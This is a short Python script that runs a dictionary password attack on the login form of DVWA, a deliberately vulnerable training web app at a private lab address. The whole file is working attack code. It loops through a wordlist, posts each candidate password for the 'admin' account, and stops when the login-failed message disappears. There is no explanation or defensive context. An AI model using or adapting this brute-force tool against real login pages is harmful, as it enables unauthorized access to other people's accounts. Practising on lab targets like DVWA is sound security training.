#!/usr/bin/env python
import requests,sys

TARRGET = "http://192.168.44.128/dvwa/login.php"
WORDLIST = "dictionary.list"
CHECK = '<div class="message">Login failed</div>'

fdata = {'username': "admin", 'password': "", 'Login':"submit"}

try:
    count = 0
    print("====================DICT-ATTACK==========================")
    with open(WORDLIST, "r") as wordlist :
        for word in wordlist:
            word = word.strip()
            fdata['password'] = word
            print("\r[!] " + str(count) + " tested , go for :{" + fdata['username'] + ", " + fdata["password"] + "}"),
            sys.stdout.flush()
            resp = requests.post(TARRGET,data=fdata)
            if CHECK not in resp.content:
                print("\n[+] possible login : " + str(fdata))
                sys.exit()
            count += 1
    print("\n[-] Login info not found in dictionary")

except KeyboardInterrupt:
    print("Ctrl+C detected quiting")
